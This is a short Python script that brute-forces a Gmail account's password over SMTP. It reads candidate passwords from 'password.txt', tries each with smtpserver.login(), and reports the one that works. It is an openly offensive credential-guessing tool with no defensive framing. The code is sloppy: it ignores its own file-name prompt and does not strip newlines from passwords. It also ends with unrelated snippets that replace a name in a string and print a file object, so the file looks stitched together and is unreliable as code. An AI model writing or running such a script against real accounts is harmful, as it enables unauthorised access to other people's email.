from datetime import *
import smtplib
smtpserver=smtplib.SMTP("smtp.gmail.com",587)
smtpserver.ehlo()
smtpserver.starttls()
email=input("enter your email: ")
#email=email.repalce("@gmail.com","")
password=input("enter pass file")
password=open('password.txt',"r")
for passw in password:
    try:
        smtpserver.login(email,passw)
        print("password founded>>=",passw)
        break
    except smtplib.SMTPAuthenticationError:
        print("can't found",passw)
        

s=input("enter name :")
s=s.replace("ahmed","intligent")
print(s)
d=open("ddd.txt","r")
print(d)
